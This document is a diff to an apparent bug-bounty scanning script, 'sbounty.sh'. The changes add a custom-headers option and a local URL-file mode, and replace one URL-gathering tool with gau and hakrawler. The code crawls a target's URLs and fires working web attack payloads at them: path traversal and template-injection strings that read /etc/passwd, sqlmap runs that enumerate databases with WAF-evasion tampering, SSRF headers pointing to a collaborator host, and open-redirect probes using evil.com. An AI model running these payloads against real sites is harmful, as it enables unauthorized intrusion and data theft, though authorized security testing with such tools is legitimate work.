@@ -27,20 +27,22 @@ printf "                                by Shockz${reset}\n"
 
 function help(){
     printf "#################################\n"
-	printf "Usage: $0 [-s subdomain] [-t] \n"
+	printf "Usage: $0 [-f urls_file] [-s subdomain] [-t] \n"
+    printf "**THIS ONLY WORKS With No-Authenticated websites**\n"
     printf " \n"
     printf " ${bblue}TARGET OPTIONS${reset}\n"
-	printf "   -s subdomain      Target subdomain\n"
+	printf "   -s subdomain      Live Target subdomain\n"
+    printf "   -f file           Urls file (Local Target)\n"
     printf " \n"
     printf " ${bblue}MODE OPTIONS${reset}\n"
-    printf "   -t                Subdomain Takeover - Perform a subdomain takeover check\n"
+    printf "   -t                Live Subdomain Takeover - Perform a subdomain takeover check\n"
     printf "   -h                Help - Show this help\n"
     printf " \n"
 	printf " ${bblue}USAGE EXAMPLES${reset}\n"
+	printf " ./sbounty.sh -f urls.txt\n"
 	printf " ./sbounty.sh -s tesla.com\n"
     printf " ./sbounty.sh -s www.tesla.com\n"
     printf " ./sbounty.sh -s https://www.tesla.com\n"
-    printf " ./sbounty.sh -s 127.0.0.1:8080\n"
 	printf " \n"
     printf " Subdomain Takeover check:\n"
     printf " ./sbounty.sh -s www.tesla.com -t \n"
@@ -99,8 +101,9 @@ EOF
     which freq &>/dev/null || allinstalled=false;
     which subjack &>/dev/null || allinstalled=false;
     which httpx &>/dev/null || allinstalled=false;
-    which gauplus &>/dev/null || allinstalled=false;
+    which gau &>/dev/null || allinstalled=false;
     which uro &>/dev/null || allinstalled=false;
+    which hakrawler &>/dev/null || allinstalled=false;
     
 
     if [ "${allinstalled}" = true ]; then
@@ -115,9 +118,10 @@ EOF
         gotools["qsreplace"]="go install -v github.com/tomnomnom/qsreplace@latest"
         gotools["waybackurls"]="go install -v github.com/tomnomnom/waybackurls@latest"
         gotools["httpx"]="go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
-        gotools["gauplus"]="go install github.com/bp0lr/gauplus@latest"
+        gotools["gau"]="go install github.com/lc/gau/v2/cmd/gau@latest"
         gotools["rush"]="go install github.com/shenwei356/rush@latest"
         gotools["freq"]="go install github.com/takshal/freq@latest"
+        gotools["hakrawler"]="go install github.com/hakluke/hakrawler@latest"
 
         for gotool in "${!gotools[@]}"; do
             go_step=$((go_step + 1))
@@ -148,9 +152,9 @@ function reflected_xss(){
     found=false
 
     while read -r parameter; do
-        printf "\n${bgreen}[*]${reset} Payload: $parameter\n"
+        #printf "\n${bgreen}[*]${reset} Payload: $parameter\n"
 
-        gf xss < $urls_output_path | qsreplace "$parameter" | freq | tee -a $output | grep "31m"
+        gf xss < $urls_output_path | qsreplace "$parameter" 2> /dev/null | freq | tee -a $output | grep "31m" 
 
         if grep -q "31m" $output; then
             found=true
@@ -171,7 +175,7 @@ function sqli(){
     cat /dev/null > $output
     printf "\n${bblue}[**]${reset} SQL Injection ${bblue}[**]${reset}\n"
 
-    gf sqli < $urls_output_path >> $output_urls; sqlmap -m $output_urls --batch -v 0 --flush-session --random-agent --level 1 --dbs --tamper=space2comment --random-agent | tee -a $output
+    gf sqli < $urls_output_path >> $output_urls; sqlmap -m $output_urls --batch -v 0 --flush-session --random-agent --level 1 --dbs --tamper=space2comment --headers="$headers" --random-agent | tee -a $output
 
     if ! grep -q "available databases" $output ;then
         printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
@@ -200,7 +204,7 @@ function ssrf(){
     cat /dev/null > $output
     printf "\n${bblue}[**]${reset} SSRF ${bblue}[**]${reset}\n"
 
-    grep "=" < $urls_output_path | qsreplace $burpcollaborator | rush -j40 'if curl -skL "{}" -o /dev/null -H "CF-Connecting_IP: $burpcollaborator" -H "From: root@$burpcollaborator" -H "Client-IP: $burpcollaborator" -H "X-Client-IP: $burpcollaborator" -H "X-Forwarded-For: $burpcollaborator" -H "X-Wap-Profile: http://$burpcollaborator/wap.xml" -H "Forwarded: $burpcollaborator" -H "True-Client-IP: $burpcollaborator" -H "Contact: root@$burpcollaborator" -H "X-Originating-IP: $burpcollaborator" -H "X-Real-IP: $burpcollaborator"; then echo "{}"; fi' > $output
+    grep "=" < $urls_output_path | qsreplace $burpcollaborator | rush -j40 'if curl -skL "{}" -o /dev/null -H "$headers CF-Connecting_IP: $burpcollaborator" -H "From: root@$burpcollaborator" -H "Client-IP: $burpcollaborator" -H "X-Client-IP: $burpcollaborator" -H "X-Forwarded-For: $burpcollaborator" -H "X-Wap-Profile: http://$burpcollaborator/wap.xml" -H "Forwarded: $burpcollaborator" -H "True-Client-IP: $burpcollaborator" -H "Contact: root@$burpcollaborator" -H "X-Originating-IP: $burpcollaborator" -H "X-Real-IP: $burpcollaborator"; then echo "{}"; fi' > $output
     printf "\n${byellow}[!]${reset} Check Burp Collaborator Poll\n"
 }
 
@@ -213,7 +217,7 @@ function lfi(){
     printf "\n${bblue}[**]${reset} LFI ${bblue}[**]${reset}\n"
 
     gf lfi < $urls_output_path | qsreplace "../../../../../../../../etc/passwd" >> $output_urls;
-    while read url;do curl -s "%" 2>&1 | grep -q "root:x" && printf "${bred}VULN! %${reset}" > $output && found=true  ;done < $output_urls
+    while read url;do curl --header "$headers" -s "%" 2>&1 | grep -q "root:x" && printf "${bred}VULN! %${reset}" > $output && found=true  ;done < $output_urls
 
     if ! $found;then
         printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
@@ -233,7 +237,7 @@ function ssti(){
 
     gf ssti < $urls_output_path | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" >> $output_urls;
 
-    while read url;do curl -s "%" 2>&1 | grep -q "root:x" && printf "${bred}VULN! %${reset}" > $output && found=true  ;done < $output_urls
+    while read url;do curl --header "$headers" -s "%" 2>&1 | grep -q "root:x" && printf "${bred}VULN! %${reset}" > $output && found=true  ;done < $output_urls
 
     if ! $found;then
         printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
@@ -265,7 +269,7 @@ function open_redirect(){
 
     printf "\n${bblue}[**]${reset} Open Redirect ${bblue}[**]${reset}\n"
 
-    gf redirect < $urls_output_path | cut -f 3- -d ':' | qsreplace "https://evil.com" | httpx -silent -status-code -location | grep -q "Location: https://evil.com" && echo "${bred}VULN! %${breset}" && found=true
+    gf redirect < $urls_output_path | cut -f 3- -d ':' | qsreplace "https://evil.com" | httpx -H "$headers" -silent -status-code -location | grep -q "Location: https://evil.com" && echo "${bred}VULN! %${breset}" && found=true
 
     if ! $found;then
         printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
@@ -279,8 +283,10 @@ function open_redirect(){
 # Singlemode
 # Config vars
 subdomain_takeover=false
+urls_file=""
+headers=""
 
-PROGARGS=$(getopt -o "s:th" -- "$@")
+PROGARGS=$(getopt -o "s:f:H:th" -- "$@")
 
 if [ $? -ne 0 ]; then
   out
@@ -291,12 +297,22 @@ unset PROGARGS
 
 while true; do
     case "$1" in
+        '-f')
+            urls_file=$2
+            shift 2
+            continue
+            ;;
         '-s')
-            if [[ "$(curl -L -s -o /dev/null -w "%{http_code}" $2)" != "200" ]]; then
-                printf "${bred}[!]${reset} ERROR: Subdomain it's not alive\n"
-                out
-            fi
+            # if [[ "$(curl -L -s -o /dev/null -w "%{http_code}" $2)" != "200" ]]; then
+            #     printf "${bred}[!]${reset} ERROR: Subdomain it's not alive\n"
+            #     out
+            # fi
             subdomain=$2
+            shift 2
+            continue
+            ;;
+        '-H')
+            headers=$2
             shift 2
             continue
             ;;
@@ -309,14 +325,31 @@ while true; do
 			shift
 			break
 		    ;;
-        '-h'| *)
+        '-h')
+            out
+            ;;
+        *)
+            echo "Argumento no reconocido: $1"
             out
 		    ;;
     esac
 done
 
-results_path="results/$subdomain"
+dominio_temp=$(echo "$subdomain" | sed -E 's/https?:\/\/(www\.)?([a-zA-Z0-9.-]+)(\/.*)?/\2/')
+dominio=$(echo "$dominio_temp" | tr -d -c '[:alnum:]')
+results_path="results/$dominio"
 urls_output_path="$results_path/urls.txt"
+
+if [ "$subdomain_takeover" = true ]; then
+    if [ -n "$subdomain" ] && [ -n "$urls_file" ]; then
+        echo "ERROR: No puedes usar los argumentos -t y -f al mismo tiempo."
+        out
+    fi
+elif [ -n "$subdomain" ] && [ -n "$urls_file" ]; then
+    echo "ERROR: No puedes usar los argumentos -s y -f al mismo tiempo."
+    out
+fi
+
 
 if [[ $(id -u | grep -o '^0$') != "0" ]]; then
     printf "${bred} Please run as root or with user added to sudoers ${reset}\n\n"
@@ -324,7 +357,6 @@ if [[ $(id -u | grep -o '^0$') != "0" ]]; then
 fi
 
 banner
-
 install
 
 if [ ! -d "$results_path" ]; then
@@ -333,10 +365,15 @@ fi
 
 printf "${bgreen}[*]${reset} Here we go buddy!!\n"
 
-printf "${bgreen}[*]${reset} Crawling and Finding URL's...\n"
-
 #URLS
-gauplus -random-agent -t 10 "$subdomain" | uro | httpx -silent -threads 100 > $urls_output_path
+if [ -n "$subdomain" ];then
+    printf "${bgreen}[*]${reset} Crawling and Finding URL's...\n"
+    gau "$subdomain" --threads 10 2> /dev/null | uro | httpx -silent -threads 100 > "$urls_output_path"
+    echo "$subdomain" | hakrawler -d 5 -insecure | uro >> "$urls_output_path"
+else
+    urls_output_path="$urls_file"
+fi
+
 
 test "$xss" = "true" && reflected_xss
 test "$sqli" = "true" && sqli
